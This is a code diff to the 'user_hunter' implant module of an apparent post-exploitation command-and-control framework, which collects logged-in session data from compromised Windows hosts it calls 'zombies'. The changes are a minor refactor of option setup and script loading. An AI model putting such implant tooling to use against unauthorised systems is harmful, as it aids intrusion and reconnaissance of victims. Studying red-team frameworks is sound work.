@@ -1,10 +1,14 @@
 import core.implant
 import core.job
 import string
+import uuid
 
 class UserHunterJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def report(self, handler, data, sanitize = False):
         data = data.decode('latin-1')
@@ -30,7 +34,7 @@ class UserHunterJob(core.job.Job):
         handler.reply(200)
 
     def parse_sessions_data(self, data):
-        self.print_good("Session data retrieved!")
+        self.print_good("Session data retrieved")
         sessions = data.split("***")
         for session in sessions:
             if session:
@@ -59,7 +63,7 @@ class UserHunterImplant(core.implant.Implant):
     STATE = "implant/gather/user_hunter"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on session.", required=False)
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on zombie.", required=False)
 
         self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "Relative path to dynwrapx.dll.", required=True, advanced=True)
         self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "Relative path to dynwrapx.manifest.", required=True, advanced=True)
@@ -73,13 +77,7 @@ class UserHunterImplant(core.implant.Implant):
         return UserHunterJob
 
     def run(self):
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/gather/user_hunter.js", self.options)
+        workloads["js"] = "data/implant/gather/user_hunter.js"
 
         self.dispatch(workloads, self.job)
